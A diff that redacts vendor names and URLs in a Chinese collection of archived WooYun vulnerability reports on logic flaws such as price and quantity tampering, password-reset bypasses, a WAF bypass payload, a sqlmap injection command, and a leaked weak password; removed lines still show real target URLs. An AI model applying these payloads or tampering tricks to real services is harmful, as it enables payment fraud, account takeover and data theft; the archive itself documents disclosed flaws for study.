-**厂商**: 百度 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-090799] 某搜索引擎云加速防御规则绕过
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -8135,9 +8135,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 测试http://www.smartcome.com/forum.php?mod=viewthread&tid=1%20union%20select%201%20from%20admin 可被拦截测试http://www.smartcome.com/forum.php?mod=viewthread&tid=1%20union%20select%201%20from可被拦截测试http://www.smartcome.com/forum.php?mod=viewthread&tid=1%20select%201%20from不被拦截
+**详情**: 测试https://example.com/[已脱敏] 可被拦截测试https://example.com/[已脱敏]
 
-**POC**: 用/*!50000SeLect*/代替select可成功绕过http://www.smartcome.com/forum.php?mod=viewthread&tid=1%20union%20/*!50000SeLect*/%201%20from%20admin 不被拦截
+**POC**: 用/*!50000SeLect*/代替select可成功绕过https://example.com/[已脱敏] 不被拦截
 
 **绕过**: 直接利用
 
@@ -8157,7 +8157,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 官网www.tonghuafund.com/ＡＰＰ下载http://android.myapp.com/myapp/detail.htm?apkName=com.tlb通联宝是通联支付全资子公司通华财富为您提供的一项可以比拟银行活期账户的高收益现金管理服务，提供国内首创的存入当日计收益的贴心服务。资金存入通联宝，预期收益高，数倍于银行活期利息，并可享受随时取现、及时到账。APP密码重置流程 测试账号：个人用户15559379841 （账户名跟手机号是一样的发送验证查看数据包验证码直接返回输入验证码，跳转至设置密码页面，输入新密码即可登录
+**详情**: 官网www.tonghuafund.com/ＡＰＰ下载https://example.com/[已脱敏] 测试账号：个人用户15559379841 （账户名跟手机号是一样的发送验证查看数据包验证码直接返回输入验证码，跳转至设置密码页面，输入新密码即可登录
 
 **POC**: (见原文)
 
@@ -8179,7 +8179,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 好压默认设置为自动升级，每次打开好压，或者解压缩软件的时候，总是不胜其烦的弹出升级。抓取下数据包发现，好压每次升级请求：POST http://update.haozip.2345.com/ HTTP/1.1Content-Type: application/x-www-form-urlencodedHost: update.haozip.2345.comContent-Length: 213Pragma: no-cacheupdater_version=10340&updater_lang=chs&lang=chs&updater_type=haozip&main_ver=5.3&silent_updater_version=10340&silent_main_ver=5.3&os_ver=6.3&csd_ver=&special_ver=000000&action_type=check
+**详情**: 好压默认设置为自动升级，每次打开好压，或者解压缩软件的时候，总是不胜其烦的弹出升级。抓取下数据包发现，好压每次升级请求：POST https://example.com/[已脱敏] HTTP/1.1Content-Type: application/x-www-form-urlencodedHost: update.haozip.2345.comContent-Length: 213Pragma: no-cacheupdater_version=10340&updater_lang=chs&lang=chs&updater_type=haozip&main_ver=5.3&silent_updater_version=10340&silent_main_ver=5.3&os_ver=6.3&csd_ver=&special_ver=000000&action_type=check
 
 **POC**: 不出意料，2345已经检测到“5.4”这个升级了。然后我的“病毒”就被下载：然后开始运行。。。
 
@@ -8223,7 +8223,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 注册个爱名网账号 http://www.22.cn/点击忘记密码进行密码找回操作稍后几秒 邮箱会注册帐号时填写的邮箱会收到一封密码找回邮件访问邮件中的密码修改地址 进入一个密码修改的页面试着直接修改链接里的uid 也就是用户id  失败！好吧 上神器chrome
+**详情**: 注册个爱名网账号 https://example.com/[已脱敏] 邮箱会注册帐号时填写的邮箱会收到一封密码找回邮件访问邮件中的密码修改地址 进入一个密码修改的页面试着直接修改链接里的uid 也就是用户id  失败！好吧 上神器chrome
 
 **POC**: 然后修改密码吧
 
@@ -8245,9 +8245,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、购买物品是数量可以是负数 选择一件购物数量为负数2、因为负数不能付款,所以我们可以买2件一件负数一件整数正好把负数的钱给减去3、下面直接来支付宝接口付款了ok
+**详情**: 1、购买物品是数量可以是负数 选择一件购物数量为负数2、因为负数不能付款,所以我们可以买2件一件负数一件整数正好把负数的钱给减去3、下面直接来某电商平台接口付款了ok
 
-**POC**: 1、购买物品是数量可以是负数 选择一件购物数量为负数2、因为负数不能付款,所以我们可以买2件一件负数一件整数正好把负数的钱给减去3、下面直接来支付宝接口付款了ok
+**POC**: 1、购买物品是数量可以是负数 选择一件购物数量为负数2、因为负数不能付款,所以我们可以买2件一件负数一件整数正好把负数的钱给减去3、下面直接来某电商平台接口付款了ok
 
 **绕过**: 直接利用
 
@@ -8313,7 +8313,7 @@
 
 **详情**: 乌云主站不存在这个漏洞，乌云zone存在。这说明什么？这说明这真的是个逻辑漏洞嘛！在zone的登录处，假如邮箱是没有注册的，那么验证码就不会失效，可以继续使用。额，截图就不需要了吧，算了，还是截一张吧
 
-**POC**: 我的作品 http://freebuf.vip/
+**POC**: 我的作品 https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8333,7 +8333,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 对于这样一个大企业来说，这漏洞影响也是很巨大的。上一个走大厂了一会，突然变小厂了，希望这个能走次大厂！http://eshop.chinadaily.com.cn/这个站完全不接受用户输入的价格参数。所以不像上一个一样，可以直接修改价格。思路也没多猥琐，价格搞不成了，咱们搞购买数量。第一次弄个负数，试了下，成功了，但是卡在支付那。所以来小数，这里演示一个价格 6400的。
+**详情**: 对于这样一个大企业来说，这漏洞影响也是很巨大的。上一个走大厂了一会，突然变小厂了，希望这个能走次大厂！https://example.com/[已脱敏] 6400的。
 
 **POC**: (见原文)
 
@@ -8365,8 +8365,8 @@
 ---
 
 ---
-### [wooyun-2013-028289] 新浪短信微博购买存支付漏洞一个月3毛钱
-**厂商**: 新浪 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-028289] 某社交平台短信某社交平台购买存支付漏洞一个月3毛钱
+**厂商**: 某社交平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -8377,7 +8377,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在支付时选择IVR语音支付，点现在支付时抓包，把radioMonth=30改为radioMonth=0.01，接下来取消代理，正常支付就可以，因新浪算法的原因，只能一天，也即一个月3毛钱
+**详情**: 在支付时选择IVR语音支付，点现在支付时抓包，把radioMonth=30改为radioMonth=0.01，接下来取消代理，正常支付就可以，因某社交平台算法的原因，只能一天，也即一个月3毛钱
 
 **POC**: (见原文)
 
@@ -8465,7 +8465,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: WooYun: QQ轻聊版调用CreateProcess漏洞WooYun: 乐视视频客户端服务存在权限提升漏洞和这些一样都是老问题了3.3.9最新版本
+**详情**: WooYun: 某互联网公司轻聊版调用CreateProcess漏洞WooYun: 乐视视频客户端服务存在权限提升漏洞和这些一样都是老问题了3.3.9最新版本
 
 **POC**: rt
 
@@ -8487,7 +8487,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 官网http://www.feijipiao.cn漏洞页面：http://www.feijipiao.cn/Account/Login发现登陆框无验证码可无限次爆破由于账户涉及到提现等金钱交易，以及订票信息，用户信息等所以危害严重
+**详情**: 官网https://example.com/[已脱敏]
 
 **POC**: 如上
 
@@ -8509,9 +8509,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: #1 介绍概述先谈一下本文的立足点，在针对Wordpress进行研究时，发现这个国外的流行应用，在核心代码安全系数很高，而在逻辑设计上，却有明显的不足。~! 遍历用户名：http://www.verycd.com/blog/?author=1通过如上链接，你只需要不停的更换author的id，就能遍历出整个Wordpress数据库内用户的username。本次测试过程中，获取到VeryCD官方博客的用户名如下：billzkyozouxiaomandaiyiVeryCDadmin!~ 坑爹的登录设计http://www.verycd.com/blog/wp-login.phpWordpress毫无节操的，无验证码、无错误密码登录次数限制，更操蛋的是，你输入一个不存在的用户名，它还会告诉你是否存在，也太高傲了一点。#2 开始测试既然知道了用户名，而且登录接口毫无阻挡，那就开启http fuzz
+**详情**: #1 介绍概述先谈一下本文的立足点，在针对Wordpress进行研究时，发现这个国外的流行应用，在核心代码安全系数很高，而在逻辑设计上，却有明显的不足。~! 遍历用户名：https://example.com/[已脱敏] 坑爹的登录设计https://example.com/[已脱敏] 开始测试既然知道了用户名，而且登录接口毫无阻挡，那就开启http fuzz
 
-**POC**: # 漏洞证明，没搞到SHELL，你说个毛线？<?php/*** WordPress 基础配置文件。** 本文件包含以下配置选项：MySQL 设置、数据库表名前缀、密钥、* WordPress 语言设定以及 ABSPATH。如需更多信息，请访问* {@link http://codex.wordpress.org/zh-cn:%E7%BC%96%E8%BE%91_wp-config.php* 编辑 wp-config.php} Codex 页面。MySQL 设置具体信息请咨询您的空间提供商。** 这个文件用在于安装程序自动生成 wp-config.php 配置文件，* 您可以手动复制这个文件，并
+**POC**: # 漏洞证明，没搞到SHELL，你说个毛线？<?php/*** WordPress 基础配置文件。** 本文件包含以下配置选项：MySQL 设置、数据库表名前缀、密钥、* WordPress 语言设定以及 ABSPATH。如需更多信息，请访问* {@link https://example.com/[已脱敏] 编辑 wp-config.php} Codex 页面。MySQL 设置具体信息请咨询您的空间提供商。** 这个文件用在于安装程序自动生成 wp-config.php 配置文件，* 您可以手动复制这个文件，并
 
 **绕过**: 直接利用
 
@@ -8519,8 +8519,8 @@
 ---
 
 ---
-### [wooyun-2012-04297] QQ在线对其隐身功能存在的BUG
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-04297] 某互联网公司在线对其隐身功能存在的BUG
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -8531,13 +8531,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 对方对你设置在线对其隐身的状态下，对方QQ状态为在线，手机端不显示其在线，对方QQ状态为离开/忙碌/请勿打扰状态下，手机端显示其在线。QQ端则都不显示。
+**详情**: 对方对你设置在线对其隐身的状态下，对方某互联网公司状态为在线，手机端不显示其在线，对方某互联网公司状态为离开/忙碌/请勿打扰状态下，手机端显示其在线。某互联网公司端则都不显示。
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 已联系腾讯后台修复
+**修复**: 已联系某互联网公司后台修复
 ---
 
 ---
@@ -8553,13 +8553,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 最近发现12306的验证码已经遭到某些厂商的密切关注，致使不管怎么改，他们都会及时破解，以至于“自动填写验证码”成了标配功能。。于是从多方面重新分析了12306的验证码机制：12306的验证码判断机制有两种，一种是提交操作的时候（比如登录），这不必多言；另一种是当填完验证码的时候，会自动检查一下验证码是否正确。（https://kyfw.12306.cn/otn/passcodeNew/checkRandCodeAnsyn?randCode=8rhw）后一种无非是增加用户体验，让用户提前知道自己输入的验证码是否正确，但是这已经被某厂商拿来所用，它可以检测自己是否填对了，若不对则刷新验证码重新识别，直到成功为止，进而向大家吹嘘自己多牛，这显然会给春运购票造成更大的拥堵。把后一种验证码判断机制去掉，对某些厂商而言，将会是致命打击；而对广大用户而言，则影响不大。PS：致媒体朋友们，转载请注意版权
+**详情**: 最近发现12306的验证码已经遭到某些厂商的密切关注，致使不管怎么改，他们都会及时破解，以至于“自动填写验证码”成了标配功能。。于是从多方面重新分析了12306的验证码机制：12306的验证码判断机制有两种，一种是提交操作的时候（比如登录），这不必多言；另一种是当填完验证码的时候，会自动检查一下验证码是否正确。（https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 将验证码预校验功能关掉！（相关URL： https://kyfw.12306.cn/otn/passcodeNew/checkRandCodeAnsyn?randCode=8rhw）
+**修复**: 将验证码预校验功能关掉！（相关URL： https://example.com/[已脱敏]
 ---
 
 ---
@@ -8619,9 +8619,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 主要发现有两处存在注射漏洞（通常还是SA+WithError的）：一是查看注册的投标厂家扫描原件处，页面URL通常为：~/会员系统/BackEnd/AttachManage/AttachView_Single.aspx?CliengGuid=xx-xx&ClientType=M&ModuleType=N； 二是会员注册检测用户名处，（有些地方可能把注册功能隐藏了，但并没有把相关页面删除，漏洞依然存在。）这是POST型的，后面就不举例了。使用这套Epoint系统的单位不少，还好存在上述的漏洞不多，应该是某特定版本吧。没看到版本信息，找起来费姥劲了，以下是确认存在上述漏洞的单位：扬中市招标投标网，注射点如：http://222.186.64.169/yzhy/BackEnd/AttachManage/AttachView_Single.aspx?CliengGuid=ebf6565f-3fd8
+**详情**: 主要发现有两处存在注射漏洞（通常还是SA+WithError的）：一是查看注册的投标厂家扫描原件处，页面URL通常为：~/会员系统/BackEnd/AttachManage/AttachView_Single.aspx?CliengGuid=xx-xx&ClientType=M&ModuleType=N； 二是会员注册检测用户名处，（有些地方可能把注册功能隐藏了，但并没有把相关页面删除，漏洞依然存在。）这是POST型的，后面就不举例了。使用这套Epoint系统的单位不少，还好存在上述的漏洞不多，应该是某特定版本吧。没看到版本信息，找起来费姥劲了，以下是确认存在上述漏洞的单位：扬中市招标投标网，注射点如：http://[IP已脱敏]
 
-**POC**: ent@debian:~$ sqlmap -u "http://www.txcetc.com:6920/txhy/BackEnd/AttachManage/AttachView_Single.aspx?CliengGuid=6e279cde-d5a3-43bd-92ad-58d0ffa2d7c1&ClientType=13&ModuleType=8103" -p ModuleType --tamper=space2comment.py --dbsavailable databases [36]:[*] [pbjs-1][*] CTICenter222[*] CTICenter_TaiXing[
+**POC**: ent@debian:~$ sqlmap -u "https://example.com/[已脱敏]" -p ModuleType --tamper=space2comment.py --dbsavailable databases [36]:[*] [pbjs-1][*] CTICenter222[*] CTICenter_TaiXing[
 
 **绕过**: 直接利用
 
@@ -8641,7 +8641,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://58.213.19.231:8080/ucenter/index.jsp苏宁的 企业侧互联网综合管理平台找回密码存在逻辑漏洞 可以直接重置密码http://58.213.19.231:8080/ucenter/forget/forgetAction!forget.actionpostnewpwd=1qaz2wsx&newpwd1=1qaz2wsx&uid=admin&question=&answer=&step=4&act=forgetstep改为4可直接绕过密保问题修改密码
+**详情**: http://[IP已脱敏] 企业侧互联网综合管理平台找回密码存在逻辑漏洞 可以直接重置密码http://[IP已脱敏]
 
 **POC**: 后台功能太强大了包内容全部记录
 
@@ -8707,7 +8707,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 已发货订单可取消，取消后已支付款项退回账户（可提现至支付宝）。
+**详情**: 已发货订单可取消，取消后已支付款项退回账户（可提现至某电商平台）。
 
 **POC**: http://www.[马赛克].cn/UserCenter/Transaction/OrderView.aspx?orderId=订单编号因为逻辑是发货后订单不可取消，这是对于逻辑来说的，对于程序来说，是没有任何意义的。document.getElementById('ctl00_Content_btnCancel').disabled=null再提交表单
 
@@ -8717,8 +8717,8 @@
 ---
 
 ---
-### [wooyun-2011-03687] 新浪SAE云平台文件系统沙箱绕过
-**厂商**: 新浪 | **年份**: 2011 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2011-03687] 某社交平台SAE云平台文件系统沙箱绕过
+**厂商**: 某社交平台 | **年份**: 2011 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -8773,7 +8773,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.yto.net.cn/cn/index/index.html的左边 快件查询
+**详情**: https://example.com/[已脱敏] 快件查询
 
 **POC**: (见原文)
 
@@ -8795,7 +8795,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这是方直金太阳旗下的商城！(感觉教材还不错~)1.选择课程：http://www.fzjty.com/jiaoxue/2.加入购物车,这演示的商品数量是3个~ 共计:2800元3.开始结算(抓包,开始拦截HTTP请求,修改好价格后，正常流程填写就行~)4.订单的确认(这个时候你可以看到,参数已经在拦截的时候修改了~)5.开始付款(这个时候金钱不在是2800,而是0.03元！亏死啊~)支付成功了！发货了开始~(我想购买10万件商品装B来,嘿嘿一心思算了~赶紧修复哦！)
+**详情**: 这是方直金太阳旗下的商城！(感觉教材还不错~)1.选择课程：https://example.com/[已脱敏] 共计:2800元3.开始结算(抓包,开始拦截HTTP请求,修改好价格后，正常流程填写就行~)4.订单的确认(这个时候你可以看到,参数已经在拦截的时候修改了~)5.开始付款(这个时候金钱不在是2800,而是0.03元！亏死啊~)支付成功了！发货了开始~(我想购买10万件商品装B来,嘿嘿一心思算了~赶紧修复哦！)
 
 **POC**: (见原文)
 
@@ -8817,9 +8817,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 是这样滴=A=这几天在研究网络验证，买了一套飘零网络验证因为之前域名没备案 所以之前用的是香港免备案空间现在备案了 换北京BGP多线 还是用的美橙互联的空间然后获取MSSQL赠品的时候 顺手看了一下审查元素。发现了产品的问题然后就抱着试一试的心态去修改了一下修改为dxnet_mssql150然后喜闻乐见发现地址栏如下：http://www.cndns.com/cn/database/sql_frm_getgift_hst.asp?gid=dxnet_mssql150&pstrotprd=sxnetqyy500_1302&pstrotnme=********&pstrotyrs=3&pstcolumn=pstprd2&sqlcheck=2其中********是产品主机名 dxnet_mssql150是产品编号我们现在修改为cloud4得到：嗯嗒 就是这样由于我需要数据库。。就用数据库来测试吧
+**详情**: 是这样滴=A=这几天在研究网络验证，买了一套飘零网络验证因为之前域名没备案 所以之前用的是香港免备案空间现在备案了 换北京BGP多线 还是用的美橙互联的空间然后获取MSSQL赠品的时候 顺手看了一下审查元素。发现了产品的问题然后就抱着试一试的心态去修改了一下修改为dxnet_mssql150然后喜闻乐见发现地址栏如下：https://example.com/[已脱敏] dxnet_mssql150是产品编号我们现在修改为cloud4得到：嗯嗒 就是这样由于我需要数据库。。就用数据库来测试吧
 
-**POC**: 是这样滴=A=这几天在研究网络验证，买了一套飘零网络验证因为之前域名没备案 所以之前用的是香港免备案空间现在备案了 换北京BGP多线 还是用的美橙互联的空间然后获取MSSQL赠品的时候 顺手看了一下审查元素。发现了产品的问题然后就抱着试一试的心态去修改了一下修改为dxnet_mssql150然后喜闻乐见发现地址栏如下：http://www.cndns.com/cn/database/sql_frm_getgift_hst.asp?gid=dxnet_mssql150&pstrotprd=sxnetqyy500_1302&pstrotnme=********&pstrotyrs=3&pstcol
+**POC**: 是这样滴=A=这几天在研究网络验证，买了一套飘零网络验证因为之前域名没备案 所以之前用的是香港免备案空间现在备案了 换北京BGP多线 还是用的美橙互联的空间然后获取MSSQL赠品的时候 顺手看了一下审查元素。发现了产品的问题然后就抱着试一试的心态去修改了一下修改为dxnet_mssql150然后喜闻乐见发现地址栏如下：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8861,9 +8861,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 开启无线传输功能后，浏览器会生成一个随机密码，正常情况下用户需要输入这个密码后才能访问管理文件。这是通过电脑浏览器访问的登录界面随意输入密码，查看返回包内容。发现登录验证返回的包内容里存在用户已下载文件列表信息。直接访问 http://192.168.0.113:8080/?action=Auth&authcode=111111&t=1434349686078
+**详情**: 开启无线传输功能后，浏览器会生成一个随机密码，正常情况下用户需要输入这个密码后才能访问管理文件。这是通过电脑浏览器访问的登录界面随意输入密码，查看返回包内容。发现登录验证返回的包内容里存在用户已下载文件列表信息。直接访问 http://[IP已脱敏]
 
-**POC**: http://192.168.0.113:8080/?action=Auth&authcode=111111&t=1434349686078
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -9037,7 +9037,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百洋医药集团有限公司是专注于健康产业投资的企业集团，主要投资健康品牌、企业股权及健康产业相关物业，目前集团下设百洋医药，百洋投资和百洋地产三大业务板块。百洋医药作为专业的健康品牌运营商，在全国各地设有10个分公司、50余个办事处，专业营销人员1000余人，与全国9000家大中型医院750家各级药品批发公司，170,000多家药店建立起了广泛的业务联系。百洋医药已连续打造出多个年销售过亿元人民币的知名药品品牌，并已经成为国内外多个药品品牌的中国大陆总代理，同时拥有符合专业电商及新版GSP标准的现代医药物流配送平台。漏洞地址：http://oa.baiyyy.com/login.jsp弱口令：liuhong 123456邮箱：当前在线：论坛：
+**详情**: 百洋医药集团有限公司是专注于健康产业投资的企业集团，主要投资健康品牌、企业股权及健康产业相关物业，目前集团下设百洋医药，百洋投资和百洋地产三大业务板块。百洋医药作为专业的健康品牌运营商，在全国各地设有10个分公司、50余个办事处，专业营销人员1000余人，与全国9000家大中型医院750家各级药品批发公司，170,000多家药店建立起了广泛的业务联系。百洋医药已连续打造出多个年销售过亿元人民币的知名药品品牌，并已经成为国内外多个药品品牌的中国大陆总代理，同时拥有符合专业电商及新版GSP标准的现代医药物流配送平台。漏洞地址：https://example.com/[已脱敏] 123456邮箱：当前在线：论坛：
 
 **POC**: (见原文)
 
@@ -9105,7 +9105,7 @@
 
 **详情**: 注册用户在充值秒币时，通过修改链接地址数值，可以达到充值金额数值的修改。
 
-**POC**: 1.注册-登陆-充值随便选择一个，点击“确认购买”2.3.http://www.miaobid.com/Default.aspx?rid=mbid_20120512174012&&subject=%e8%b4%ad%e4%b9%b0%e7%a7%92%e5%bf%85%e5%be%97%e7%a7%92%e5%b8%8120000%e4%b8%aa&&body=%e8%b4%ad%e4%b9%b0%e7%a7%92%e5%bf%85%e5%be%97%e7%a7%92%e5%b8%8120000%e4%b8%aa&&total_fee=2000.00（把这里的2000.00修改成任意你想充值的
+**POC**: 1.注册-登陆-充值随便选择一个，点击“确认购买”2.3.https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -9135,8 +9135,8 @@
 ---
 
 ---
-### [wooyun-2013-042036] 新浪某站VIP购买可任意修改价格(有支付证明)
-**厂商**: 新浪 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-042036] 某社交平台某站VIP购买可任意修改价格(有支付证明)
+**厂商**: 某社交平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -9169,7 +9169,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、看到了排行榜第一的妹纸，先搞到id2、关注抓包就搞到了啊：user_id=7389003、果断发帖修改id4、哈哈哈5、测试地址：http://www.hunliji.com/exhibit/community_threads/33510http://www.hunliji.com/exhibit/community_threads/33507
+**详情**: 1、看到了排行榜第一的妹纸，先搞到id2、关注抓包就搞到了啊：user_id=7389003、果断发帖修改id4、哈哈哈5、测试地址：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -9257,7 +9257,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 我是在14：16分用3块钱开的机子，2元/小时，已经16：32了，也就是我已经用1个小时30分钟的钱上了2个多小时的网，而且只要我不关机我可以连续一天玩。具体方法：1.找到进程中的clsmn，开始检测2.找到线程 iocp.dll（4个），选择全部挂起3.等4个iocp.dll线程都变成红色，恭喜你，可以了！！！小视频：http://pan.baidu.com/s/1kT8aQWn小工具：http://pan.baidu.com/s/1ntsxJiL
+**详情**: 我是在14：16分用3块钱开的机子，2元/小时，已经16：32了，也就是我已经用1个小时30分钟的钱上了2个多小时的网，而且只要我不关机我可以连续一天玩。具体方法：1.找到进程中的clsmn，开始检测2.找到线程 iocp.dll（4个），选择全部挂起3.等4个iocp.dll线程都变成红色，恭喜你，可以了！！！小视频：https://example.com/[已脱敏]
 
 **POC**: 我是在14：16分用3块钱开的机子，2元/小时，已经16：32了，也就是我已经用1个小时30分钟的钱上了2个多小时的网，而且只要我不关机我可以连续一天玩。到了16：48，我的上级时长还是0小时37分钟。
 
@@ -9367,7 +9367,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 前两天在三福买衣服送了张会员卡说能打折。登陆上去看下发现存在支付漏洞主站：http://www.sanfu.com/随便点一个衣服加入购物车 修改购买数量为-1 然后再买一件裤子 进行结算的时候提示购物车没商品  于是再买了见背心  呵呵 订单提交成功。加上邮费一共39  你们感觉贵么？
+**详情**: 前两天在三福买衣服送了张会员卡说能打折。登陆上去看下发现存在支付漏洞主站：https://example.com/[已脱敏] 修改购买数量为-1 然后再买一件裤子 进行结算的时候提示购物车没商品  于是再买了见背心  呵呵 订单提交成功。加上邮费一共39  你们感觉贵么？
 
 **POC**: (见原文)
 
@@ -9435,7 +9435,7 @@
 
 **详情**: @/fd的代码里对于列目录有两个方法，一是利用DirectoryIterator类，二是利用realpath函数。前者很好用，我就不多说了。单说下后者，realpath函数在处理已存在的文件（目录）与不存在的文件（目录）时情况不同，如果文件已存在则会抛出错误:open_basedir restriction in effect. File(xxxxx) is not within the allowed path(s)，如果文件不存在则会返回false。所以我们可以通过捕捉错误handle，来判断某文件是否存在。我的第二个方法也类似。php中有个bindtextdomain函数，看看文档：为一个domain设置一个path，这个path就是一个文件名。这个函数，在$directory存在的时候返回$directory，不存在则返回false。测试代码：<?phpprintf('<b>ope
 
-**POC**: 很不幸的是，这个函数似乎不支持windows，我在win下测试报错Call to undefined function bindtextdomain()……，而linux下似乎没有<>等好用的通配符？所以只能暴力枚举了。暴力枚举方法见@/fd的代码：http://zone.wooyun.org/content/11268
+**POC**: 很不幸的是，这个函数似乎不支持windows，我在win下测试报错Call to undefined function bindtextdomain()……，而linux下似乎没有<>等好用的通配符？所以只能暴力枚举了。暴力枚举方法见@/fd的代码：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -9477,7 +9477,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 芒果TV视频播放器最新版版本：4.2.0.111  官方下载安装版本mangguoTV_V4.2.0.111_setup.1426835792.exe ，不存在的DLL：QMediaInfo.dll    evr.dll（这些文件没有随芒果TV播放器一起安装），导致恶意攻击者可以伪造DLL文件用于劫持目录：F:\HunanTV\
+**详情**: 芒果TV视频播放器最新版版本：[IP已脱敏]  官方下载安装版本mangguoTV_V4.2.0.111_setup.1426835792.exe ，不存在的DLL：QMediaInfo.dll    evr.dll（这些文件没有随芒果TV播放器一起安装），导致恶意攻击者可以伪造DLL文件用于劫持目录：F:\HunanTV\
 
 **POC**: (见原文)
 
@@ -9499,7 +9499,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 拉钩地址：http://www.lagou.com/gongsi/78386.htmlAPP名称：大白APP地址：http://site682174-8413-203.strikingly.com/APP漏洞简介：短信验证码明文返回。导致可以批量注册任意手机号，可以重置任意手机号密码。
+**详情**: 拉钩地址：https://example.com/[已脱敏]
 
 **POC**: 1，任意用户注册【验证码明文返回】2，注册成功3，同理重置任意用户密码时短信验证码也是明文返回的
 
@@ -9523,7 +9523,7 @@
 
 **详情**: RT
 
-**POC**: URL:http://zzb.hfut.edu.cn/member任意注册一个用户.进入之后选择修改信息修改密码和信息 然后抓包将useid换成管理员的admin提示修改成功之后找到后台 利用刚修改的密码 登录后台登录成功，修改允许上传的文件格式
+**POC**: URL:https://example.com/[已脱敏] 然后抓包将useid换成管理员的admin提示修改成功之后找到后台 利用刚修改的密码 登录后台登录成功，修改允许上传的文件格式
 
 **绕过**: 直接利用
 
@@ -9531,8 +9531,8 @@
 ---
 
 ---
-### [wooyun-2014-063822] 360/加速乐/百度云加速/安全宝等所有waf产品某些条件下绕过
-**厂商**: 360/加速乐/百度云加速/安全宝 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-063822] 360/加速乐/某搜索引擎云加速/安全宝等所有waf产品某些条件下绕过
+**厂商**: 360/加速乐/某搜索引擎云加速/安全宝 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -9543,7 +9543,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 测试了下市面上 360/加速乐/百度云加速/安全宝这四个waf产品  在某种条件下均可以绕过 顺利注射出数据库信息。首先我自己搭建了环境 mssql+asp构造了一个 数字型的报错注入点。http://192.168.1.106:81/asp/num.asp?id=host_name()http://192.168.1.106:81/asp/num.asp?id=userhttp://192.168.1.106:81/asp/num.asp?id=APP_NAME()等等 可以根据内置变量爆出很多想要的信息。另外 如果能猜到字段名还可以这样。爆出了用户名与密码。在测试 做了 360网站卫士/加速乐/百度云加速/安全宝 保护的网站之后对这种情况的注射都 束手无策，全部都放行。这里仅用一例 说明下面是加速乐保护的http://www.cert.org.cn/num.asp?id=usernam
+**详情**: 测试了下市面上 360/加速乐/某搜索引擎云加速/安全宝这四个waf产品  在某种条件下均可以绕过 顺利注射出数据库信息。首先我自己搭建了环境 mssql+asp构造了一个 数字型的报错注入点。http://[IP已脱敏] 可以根据内置变量爆出很多想要的信息。另外 如果能猜到字段名还可以这样。爆出了用户名与密码。在测试 做了 360网站卫士/加速乐/某搜索引擎云加速/安全宝 保护的网站之后对这种情况的注射都 束手无策，全部都放行。这里仅用一例 说明下面是加速乐保护的https://example.com/[已脱敏]
 
 **POC**: 同上
 
@@ -9589,7 +9589,7 @@
 
 **详情**: 看视频
 
-**POC**: 绕过的开始绕过微博绕过短信和通讯录绕过相册播放密码03sec
+**POC**: 绕过的开始绕过某社交平台绕过短信和通讯录绕过相册播放密码03sec
 
 **绕过**: 直接利用
 
@@ -9609,7 +9609,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
